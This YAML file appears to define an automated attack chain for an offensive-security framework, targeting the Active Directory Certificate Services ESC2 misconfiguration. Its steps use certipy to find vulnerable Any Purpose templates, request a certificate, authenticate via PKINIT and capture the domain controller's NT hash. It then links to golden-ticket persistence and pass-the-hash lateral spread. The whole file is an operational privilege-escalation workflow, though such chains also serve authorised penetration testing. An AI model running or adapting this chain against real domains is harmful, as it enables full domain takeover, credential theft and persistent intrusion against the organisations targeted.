id: esc2-adcs-any-purpose
name: "ADCS ESC2 — Any Purpose EKU template"
description: >
  Template with the `Any Purpose` EKU (OID 2.5.29.37.0) — when enrollable
  by low-priv, you can request a cert valid for client authentication AND
  enrollment agent → mint certs for anyone. Plus, you don't need SAN
  control (unlike ESC1).
tags: [adcs, esc2, priv-esc, certificates, active-directory]
difficulty: medium

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain
    required: true
  - name: user
    source: target_context.user
    required: true
  - name: password
    source: target_context.password
    required: true

steps:
  - id: find_esc2
    name: "Find templates flagged ESC2"
    command_ref: certipy-find
    inputs:
      ip: "${dc_ip}"
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
    notes: |
      Look for `[!] Vulnerabilities: ESC2` and your principal in
      `Enrollment Rights`. Record the template + CA name.
    capture:
      - var: vuln_template
        regex: 'Template Name\s*:\s*(\S+)\s*\n[\s\S]*?Vulnerabilities[\s\S]*?ESC2'
        match: first
      - var: ca_name
        regex: 'CA Name\s*:\s*(.+?)$'
        match: first

  - id: request_anypurpose
    name: "Request cert via Any Purpose template"
    command_ref: certipy-esc2
    requires: [vuln_template, ca_name]
    inputs:
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
      dc-ip: "${dc_ip}"
      ca_name: "${ca_name}"
      vulnerable_template: "${vuln_template}"
    capture:
      - var: pfx_file
        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
        match: first

  - id: pkinit_auth
    name: "Authenticate with the cert"
    command_ref: certipy-auth
    requires: [pfx_file]
    inputs:
      pfx_file: "${pfx_file}"
      ip: "${dc_ip}"
    capture:
      - var: dc_nt_hash
        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
        match: first

references:
  - title: "Certified Pre-Owned — ESC2"
    url:   "https://posts.specterops.io/certified-pre-owned-d95910965cd2"

next_chains:
  - chain: ad-persistence-golden-ticket
    when:   'dc_nt_hash captured'
    reason: 'Domain admin → Golden Ticket.'
  - chain: pth-lateral-spread
    when:   'dc_nt_hash captured'
    reason: 'Spread the DA hash.'
